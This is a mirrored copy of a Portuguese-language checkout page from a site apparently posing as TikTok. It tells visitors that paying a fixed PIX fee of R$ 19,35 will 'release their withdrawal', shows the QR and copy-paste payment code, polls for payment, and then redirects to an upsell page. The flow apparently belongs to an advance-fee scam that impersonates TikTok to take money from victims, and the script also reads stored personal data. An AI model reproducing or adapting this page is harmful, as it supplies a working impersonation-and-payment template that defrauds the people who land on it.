<!DOCTYPE html>
<html lang="pt-br">
<!-- Mirrored from bonusdotik.shop/up1/checkout/index.html?upsell=up1 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 02 Jan 2026 23:51:28 GMT -->

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Checkout - TikTok</title>
  <script src="https://cdn.tailwindcss.com/"></script>
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap");

    body {
      font-family: "Inter", sans-serif;
      background-color: #ffffff;
      color: #161823;
    }

    .btn-tiktok {
      background-color: #fe2c55;
      transition: all 0.2s ease;
    }

    .btn-tiktok:active {
      transform: scale(0.96);
      opacity: 0.9;
    }

    .logo-sharp {
      filter: contrast(1.1) brightness(1.05);
      image-rendering: -webkit-optimize-contrast;
    }

    .hidden {
      display: none;
    }
  </style>
</head>

<body class="antialiased">
  <div
    class="bg-black text-white text-center py-2 px-4 text-[12px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
    Finalize seu pagamento para liberar o saque
  </div>

  <div class="max-w-md mx-auto min-h-screen pb-12 bg-white">
    <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
      <img src="https://i.postimg.cc/XYwkPWhz/imagem-2026-01-02-213823889.png" alt="TikTok Logo"
        class="h-28 w-28 object-contain mb-6 logo-sharp drop-shadow-sm" />
      <div class="text-center">
        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">
          Valor do Pagamento
        </p>
        <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="paymentValue">
          R$ 0,00
        </h2>
      </div>
    </div>

    <div class="px-6 py-8">
      <!-- Loading -->
      <div id="loading" class="flex flex-col items-center justify-center min-h-[400px]">
        <div class="text-center">
          <div
            class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-[#FE2C55] border-t-transparent mb-6">
          </div>
          <p class="text-gray-700 font-bold text-lg">Gerando c√≥digo PIX...</p>
          <p class="text-gray-500 text-sm mt-2">Aguarde um momento</p>
        </div>
      </div>

      <!-- QR Code -->
      <div id="qrcodeSection" class="hidden">
        <div class="text-center mb-6">
          <h3 class="text-2xl font-black mb-2 text-gray-900">
            Escaneie o QR Code
          </h3>
          <p class="text-gray-500 text-sm">Ou copie o c√≥digo PIX abaixo</p>
        </div>
        <div
          class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
          <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg" />
        </div>
        <div class="mb-6">
          <label class="block text-sm font-bold text-gray-700 mb-3">C√≥digo PIX (Copiar e Colar)</label>
          <div class="flex gap-2">
            <input type="text" id="pixCode" readonly
              class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono" />
            <button
              class="btn-tiktok px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all"
              id="copy-pix-button">
              COPIAR
            </button>
          </div>
        </div>

        <!-- Instru√ß√µes de Pagamento PIX -->
        <div class="bg-gradient-to-r from-emerald-50 to-teal-50 rounded-2xl p-5 mb-6 border border-emerald-200">
          <h4 class="text-base font-black text-emerald-800 mb-4 flex items-center gap-2">
            <span class="text-xl">üì±</span> Como pagar com PIX
          </h4>
          <div class="space-y-3">
            <div class="flex items-start gap-3">
              <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
                <span class="text-white text-xs font-bold">1</span>
              </div>
              <p class="text-sm text-gray-700">
                Abra o <strong>app do seu banco</strong> no celular
              </p>
            </div>
            <div class="flex items-start gap-3">
              <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
                <span class="text-white text-xs font-bold">2</span>
              </div>
              <p class="text-sm text-gray-700">
                Escolha pagar com <strong>PIX</strong> e selecione
                <strong>"Copia e Cola"</strong> ou <strong>"QR Code"</strong>
              </p>
            </div>
            <div class="flex items-start gap-3">
              <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
                <span class="text-white text-xs font-bold">3</span>
              </div>
              <p class="text-sm text-gray-700">
                <strong>Cole o c√≥digo</strong> copiado ou
                <strong>escaneie o QR Code</strong> acima
              </p>
            </div>
            <div class="flex items-start gap-3">
              <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
                <span class="text-white text-xs font-bold">4</span>
              </div>
              <p class="text-sm text-gray-700">
                Confirme o pagamento e <strong>aguarde a confirma√ß√£o</strong>
              </p>
            </div>
          </div>
        </div>

        <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
          <p class="text-sm text-gray-700">
            <strong class="text-blue-700">Aguardando pagamento...</strong><br />
            <span class="text-gray-600">O status ser√° atualizado automaticamente.</span>
          </p>
        </div>
        <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">
          Status: Aguardando pagamento
        </div>
      </div>
    </div>

    <!-- Sucesso -->
    <div id="successSection" class="hidden px-6 py-8">
      <div class="text-center">
        <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
          </svg>
        </div>
        <h3 class="text-2xl font-black mb-2 text-green-600">
          Pagamento Confirmado!
        </h3>
        <p class="text-gray-600 mb-6">Seu saque ser√° liberado em breve.</p>
      </div>
    </div>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const upsellId = urlParams.get("upsell") || "up1";

    let transactionId = null;
    let checkInterval = null;
    let isGeneratingPix = false;
  </script>
</body>

<script>
  const confirmBtn = document.getElementById("btn-confirmar");
  const clientRawData = localStorage.getItem("checkout_personal_data");
  const clientData = clientRawData ? JSON.parse(clientRawData) : {};
  const pixPaymentScreen = document.getElementById("pix-payment-screen");
  const pixScreenBackButton = document.getElementById(
    "pix-screen-back-button"
  );
  const pixLoadingState = document.getElementById("pix-loading");
  const pixDetails = document.getElementById("pix-details");
  const pollingMessageEl = document.getElementById("polling-message");
  const copyPixButton = document.getElementById("copy-pix-button");
  const copyFeedback = document.getElementById("copy-feedback");
  const pixCodeText = document.getElementById("pixCode");
  const pixSubtotal = document.getElementById("pix-subtotal");
  const pixTotal = document.getElementById("pix-total");

  const pixLoadingScreen = document.getElementById("loading");
  const pixQrCodeScreen = document.getElementById("qrcodeSection");
  const pixSuccessScreen = document.getElementById("successSection");
  const qrCodeImage = document.getElementById("qrCodeImage");
  const pixCode = document.getElementById("pixCode");
  const paymentField = document.getElementById("paymentValue");
  const pathParts = window.location.pathname.split('/').filter(Boolean);
  const baseFolder = pathParts[0];


  console.log(clientData);

  function showPopUp() {
    const overlay = document.getElementById("overlay");
    const popup = document.getElementById("popup");
    overlay.style.display = "block";
    popup.style.display = "block";
  }

  function formatPrice(price) {
    return `R$ ${parseFloat(price).toFixed(2).replace(".", ",")}`;
  }

  // Setup listeners
  document.addEventListener("DOMContentLoaded", () => {
    const copyBtn = document.getElementById("pix-copy-btn");
    if (copyBtn) {
      copyBtn.addEventListener("click", () => {
        const copyText = document.getElementById("pixCode");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        if (navigator.clipboard) {
          navigator.clipboard
            .writeText(copyText.value)
            .then(() => {
              const originalText = copyBtn.textContent;
              copyBtn.textContent = "Copiado!";
              setTimeout(() => (copyBtn.textContent = originalText), 2000);
            })
            .catch((err) => {
              console.error("Erro ao copiar", err);
            });
        } else {
          document.execCommand("copy");
          const originalText = copyBtn.textContent;
          copyBtn.textContent = "Copiado!";
          setTimeout(() => (copyBtn.textContent = originalText), 2000);
        }
      });
    }

    const manualBtn = document.getElementById("pix-confirm-manual-btn");
    if (manualBtn) {
      manualBtn.addEventListener("click", () => {
        if (typeof Swal !== "undefined") {
          Swal.fire({
            title: "Verificando...",
            text: "Aguarde um momento.",
            timer: 2000,
            showConfirmButton: false,
          });
        } else {
          alert("Verificando pagamento...");
        }
      });
    }
  });

  function showError(msg) {
    if (typeof Swal !== "undefined") {
      Swal.fire({
        title: "Erro",
        text: msg,
        icon: "error",
        confirmButtonText: "OK",
      });
    } else {
      alert(msg);
    }
  }

  let pollingInterval;
  let pollingAttempts = 0;
  const MAX_POLLING_ATTEMPTS = 60;

  const transactionInfoRaw = localStorage.getItem("frontPaymentResponse");
  const transactionInfo = JSON.parse(transactionInfoRaw);
  console.log(transactionInfo);
  const transactionToken = transactionInfo.token;

  if (transactionInfo) {
    pixLoadingScreen.classList.add("hidden");
    pixQrCodeScreen.classList.remove("hidden");
    startPaymentPolling(transactionToken);

    qrCodeImage.src = transactionInfo.qrCodeUrl;
    pixCode.value = transactionInfo.pixCode;
    paymentField.textContent = formatPrice(19.35);
  }

  async function startPaymentPolling(transactionToken) {
    if (pollingInterval) clearInterval(pollingInterval);
    pollingAttempts = 0;

    pollingInterval = setInterval(async () => {
      pollingAttempts++;
      if (pollingAttempts > MAX_POLLING_ATTEMPTS) {
        clearInterval(pollingInterval);
        return;
      }

      try {
        const response = await fetch(`/api/check-status?id=${transactionToken}`);
        if (!response.ok) return;

        const result = await response.json();

        console.log("Status Polling:", result.status);

        // Verifica o status unificado (API ou Banco de Dados)
        const currentStatus = (result.status || '').toLowerCase();

        // Remove verifica√ß√£o de propriedade aninhada perigosa
        if (currentStatus === 'approved' || currentStatus === 'paid') {
          clearInterval(pollingInterval);
          pixLoadingScreen.classList.add("hidden");
          pixQrCodeScreen.classList.add("hidden");
          pixSuccessScreen.classList.remove("hidden");

          setTimeout(() => {
            window.location.href = `../upsell1.html${window.location.search}`;
          }, 2000);

        } else if (
          result.status &&
          ![
            "PENDING_NO_WEBHOOK",
            "PENDING_ERROR_READ",
            "PROCESSING",
            "AUTHORIZED",
            "WAITING_PAYMENT",
            "WAITING PAYMENT",
            "PENDING",
            "APPROVED",
            "PAID"
          ].includes(result.status.toUpperCase())
        ) {
          stopPaymentPolling();
        }
      } catch (error) {
        console.error("Polling error", error);
      }
    }, 5000);
  }

  function hidePixScreen() {
    pixPaymentScreen.style.display = "none";
    document.body.style.overflow = "auto";
    stopPaymentPolling();
    resetConfirmButton();
  }

  function stopPaymentPolling() {
    if (pollingInterval) {
      clearInterval(pollingInterval);
      pollingInterval = null;
    }
    pollingAttempts = 0;
  }

  function resetConfirmButton() {
    confirmBtn.disabled = false;
    confirmBtn.innerHTML =
      '<i class="fa-solid fa-check"></i> Carregando regulariza√ß√£o...';
  }

  copyPixButton.addEventListener("click", function () {
    const btn = this;
    if (pixCodeText) {
      navigator.clipboard
        .writeText(pixCodeText.value.trim())
        .then(() => {
          btn.textContent = "C√≥digo PIX copiado!";
          setTimeout(() => {
            btn.textContent = "COPIAR";
          }, 3000);
        })
        .catch((err) => {
          console.error("Erro ao copiar PIX:", err);
          btn.textContent = "Erro ao copiar.";
        });
    }
  });
</script>

</html>